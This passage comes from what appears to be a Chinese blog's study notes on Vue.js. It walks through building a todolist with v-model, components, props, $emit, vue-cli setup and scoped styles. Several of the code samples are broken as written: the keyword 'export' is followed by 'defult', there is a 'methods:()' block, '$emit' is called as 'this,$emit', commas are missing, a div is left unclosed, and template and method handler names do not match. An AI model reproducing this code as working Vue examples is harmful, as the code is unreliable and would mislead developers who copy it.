class="keyword">this</span>.show = !<span class="keyword">this</span>.show;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ol start="7">
<li>todolist功能开发<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"inputValue"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"hanleSubmit"</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"(item,index) of list"</span> <span class="attr">:key</span>=<span class="string">"index"</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#root"</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            inputValue:<span class="string">''</span>,</span></span><br><span class="line">            list:[]</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="actionscript">            hanleSubmit: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">this</span>.list.push(<span class="keyword">this</span>.inputValue)</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">this</span>.inputValue = <span class="string">''</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<hr>
<ol start="8">
<li>todolist组件拆分</li>
</ol>
<ul>
<li>组件（页面中的一个部分）<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"inputValue"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"hanleSubmit"</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">todo-item</span> <span class="attr">v-for</span>=<span class="string">"(item,index) of list"</span> <span class="attr">:key</span>=<span class="string">"index"</span> <span class="attr">:content</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">todo-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">Vue.component(<span class="string">'todo-item'</span>,&#123;  <span class="comment">//全局组件</span></span></span><br><span class="line"><span class="actionscript">    props:[<span class="string">'content'</span>],  <span class="comment">//传参</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    template:'<span class="tag">&lt;<span class="name">li</span>&gt;</span></span><span class="template-variable">&#123;&#123;content&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span>'</span></span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="actionscript"><span class="comment">//var TodoItem = &#123;  //局部组件</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    template:'<span class="tag">&lt;<span class="name">li</span>&gt;</span>item<span class="tag">&lt;/<span class="name">li</span>&gt;</span>'</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#root"</span>,</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//components:&#123;  //在实例里注册局部组件</span></span></span><br><span class="line"><span class="actionscript">            <span class="string">'todo-item'</span>:TodoItem</span></span><br><span class="line">        &#125;,</span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            inputValue:<span class="string">''</span>,</span></span><br><span class="line">            list:[]</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="actionscript">            hanleSubmit: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">this</span>.list.push(<span class="keyword">this</span>.inputValue)</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">this</span>.inputValue = <span class="string">''</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ol start="9">
<li>组件与实例的关系</li>
</ol>
<ul>
<li>每个组件都是一个vue实例，组件=实例，没有模板时挂载点=dom<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"inputValue"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"hanleSubmit"</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">todo-item</span> <span class="attr">v-for</span>=<span class="string">"(item,index) of list"</span> <span class="attr">:key</span>=<span class="string">"index"</span> <span class="attr">:content</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">todo-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">Vue.component(<span class="string">'todo-item'</span>,&#123;</span></span><br><span class="line"><span class="actionscript">    props:[<span class="string">'content'</span>], </span></span><br><span class="line"><span class="handlebars"><span class="xml">    template:'<span class="tag">&lt;<span class="name">li</span> @<span class="attr">click</span>=<span class="string">"hanleClick"</span>&gt;</span></span><span class="template-variable">&#123;&#123;content&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span>',</span></span></span><br><span class="line">    methods:&#123;</span><br><span class="line"><span class="actionscript">        handleClick:<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            alert(<span class="string">'clicked'</span>)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#root"</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            inputValue:<span class="string">''</span>,</span></span><br><span class="line">            list:[]</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="actionscript">        template:<span class="string">''</span>, <span class="comment">//模板</span></span></span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="actionscript">            hanleSubmit: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">this</span>.list.push(<span class="keyword">this</span>.inputValue)</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">this</span>.inputValue = <span class="string">''</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ol start="10">
<li>实现Todolist的删除功能</li>
</ol>
<ul>
<li>子组件实现与否决定于父组件的数据，子组件要与父组件通信<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"inputValue"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"hanleSubmit"</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">todo-item</span> <span class="attr">v-for</span>=<span class="string">"(item,index) of list"</span> <span class="attr">:key</span>=<span class="string">"index"</span> <span class="attr">:content</span>=<span class="string">"item"</span> <span class="attr">:index</span>=<span class="string">"index"</span> @<span class="attr">delete</span>=<span class="string">"handleDelete"</span>&gt;</span><span class="tag">&lt;/<span class="name">todo-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">Vue.component(<span class="string">'todo-item'</span>,&#123;</span></span><br><span class="line"><span class="actionscript">    props:[<span class="string">'content'</span>,<span class="string">'index'</span>], </span></span><br><span class="line"><span class="handlebars"><span class="xml">    template:'<span class="tag">&lt;<span class="name">li</span> @<span class="attr">click</span>=<span class="string">"hanleClick"</span>&gt;</span></span><span class="template-variable">&#123;&#123;content&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span>',</span></span></span><br><span class="line">    methods:&#123;</span><br><span class="line"><span class="actionscript">        handleClick:<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>,$emit(<span class="string">'delete'</span>,<span class="keyword">this</span>.index)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#root"</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            inputValue:<span class="string">''</span>,</span></span><br><span class="line">            list:[]</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="actionscript">            hanleSubmit: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">this</span>.list.push(<span class="keyword">this</span>.inputValue)</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">this</span>.inputValue = <span class="string">''</span></span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="actionscript">            handleDelete:<span class="function"><span class="keyword">function</span><span class="params">(index)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">this</span>.list.splice(index,<span class="number">1</span>)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ol start="11">
<li>vue-cli的简介与使用<br>官网 –》学习 –》教程 –》安装 –》命令行工具<blockquote>
<p>node -v  //node.js官方安装<br>npm -v<br>npm install –global vue-cli //全局安装<br>vue init webpack my-project  //创建一个基于webpack模板的新项目<br>cd my-project  //安装依赖<br>npm run dev</p>
</blockquote>
</li>
</ol>
<p>build：项目webtate配置文件<br>config：开发环境线上环境配置文件<br>node——modules：依赖<br>src：源代码（可以使用es6语法）</p>
<blockquote>
<p>main.js:挂载文件<br>  xxx.vue:单文件组件（内容清空）<br>static：静态资源</p>
</blockquote>
<hr>
<ol start="12">
<li>使用vue-cli开发Todolist</li>
</ol>
<ul>
<li>终端启动vue-cli<blockquote>
<p>npm run dev</p>
</blockquote>
</li>
<li><p>main.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> Todolist <span class="keyword">from</span> <span class="string">'./Todolist'</span></span><br><span class="line"></span><br><span class="line">Vue.config.productionTip = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el:<span class="string">'#app'</span>,</span><br><span class="line">    components:&#123; Todolist &#125;,</span><br><span class="line">    template:<span class="string">'&lt;TodoList/&gt;'</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>TodoList.vue</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span>  //只能有一个大标签</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"inputValue"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"handleSubmit"</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">todo-item</span> <span class="attr">v-for</span>=<span class="string">"(item,index) of list"</span> <span class="attr">:key</span>=<span class="string">"index"</span> <span class="attr">:content</span>=<span class="string">"item"</span> <span class="attr">:index</span>=<span class="string">"index"</span> @<span class="attr">delete</span>=<span class="string">"handleDelete"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">todo-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">import</span> TodoItem <span class="keyword">from</span> <span class="string">'./components/TodoItem'</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;  <span class="comment">//对象变成函数</span></span></span><br><span class="line">  components:&#123;</span><br><span class="line"><span class="actionscript">    <span class="string">'todo-item'</span>: TodoItem</span></span><br><span class="line">  &#125;,</span><br><span class="line">  data () &#123;</span><br><span class="line"><span class="actionscript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="actionscript">          inputValue: <span class="string">''</span></span></span><br><span class="line">          list:[]</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods:&#123;</span><br><span class="line">      handleSubmit () &#123;</span><br><span class="line"><span class="actionscript">          <span class="keyword">this</span>.list.push(<span class="keyword">this</span>.inputValue)</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">this</span>.inputValue = <span class="string">''</span></span></span><br><span class="line">      &#125;,</span><br><span class="line">      handleDelete(index)&#123;</span><br><span class="line"><span class="actionscript">          <span class="keyword">this</span>.list.splice(index,<span class="number">1</span>)</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>components–&gt;TodoItem.vue(清空模板)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> @<span class="attr">click</span>=<span class="string">"handleDelete"</span>&gt;</span>&#123;&#123;content&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> defult&#123;</span></span><br><span class="line"><span class="actionscript">    props:[<span class="string">'content'</span>],</span></span><br><span class="line">    methods:()&#123;</span><br><span class="line">      handleDelete () &#123;</span><br><span class="line"><span class="actionscript">          <span class="keyword">this</span>.$emit(<span class="string">'delete'</span>,<span class="keyword">this</span>.index)</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<ol start="13">
<li>全局样式与局部样式</li>
</ol>
<ul>
<li><p>TodoList.vue</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"item"</span> <span class="attr">v-model</span>=<span class="string">"inputValue"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"handleSubmit"</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">todo-item</span> <span class="attr">v-for</span>=<span class="string">"(item,index) of list"</span> <span class="attr">:key</span>=<span class="string">"index"</span> <span class="attr">:content</span>=<span class="string">"item"</span> <span class="attr">:index</span>=<span class="string">"index"</span> @<span class="attr">delete</span>=<span class="string">"handleDelete"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">todo-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">import</span> TodoItem <span class="keyword">from</span> <span class="string">'./components/TodoItem'</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line">  components:&#123;</span><br><span class="line"><span class="actionscript">    <span class="string">'todo-item'</span>: TodoItem</span></span><br><span class="line">  &#125;,</span><br><span class="line">  data () &#123;</span><br><span class="line"><span class="actionscript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="actionscript">          inputValue: <span class="string">''</span></span></span><br><span class="line">          list:[]</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods:&#123;</span><br><span class="line">      handleSubmit () &#123;</span><br><span class="line"><span class="actionscript">          <span class="keyword">this</span>.list.push(<span class="keyword">this</span>.inputValue)</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">this</span>.inputValue = <span class="string">''</span></span></span><br><span class="line">      &#125;,</span><br><span class="line">      handleDelete(index)&#123;</span><br><span class="line"><span class="actionscript">          <span class="keyword">this</span>.list.splice(index,<span class="number">1</span>)</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>TodoItem.vue</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item"</span> @<span class="attr">click</span>=<span class="string">"handleDelete"</span>&gt;</span>&#123;&#123;content&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> defult&#123;</span></span><br><span class="line"><span class="actionscript">    props:[<span class="string">'content'</span>],</span></span><br><span class="line">    methods:()&#123;</span><br><span class="line">      handleDelete () &#123;</span><br><span class="line"><span class="actionscript">          <span class="keyword">this</span>.$emit(<span class="string">'delete'</span>,<span class="keyword">this</span>.index)</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span>  //作用域,scoped决定全局样式或局部样式</span><br><span class="line"><span class="css"><span class="selector-class">.item</span>&#123;</span></span><br><span class="line">    color: green;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<ol start="14">
<li>课程总结<br>在官网继续学习<br><a href="https://cn.vuejs.org" target="_blank" rel="noopener">Vue</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> vue.js </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Vue官方笔记]]></title>
      <url>/%E7%AC%94%E8%AE%B0/ckwd5ws8d0039d0uc8wdosv9y/</url>
      <content type="html"><![CDATA[<p>#Vue大笔记</p>
<hr>
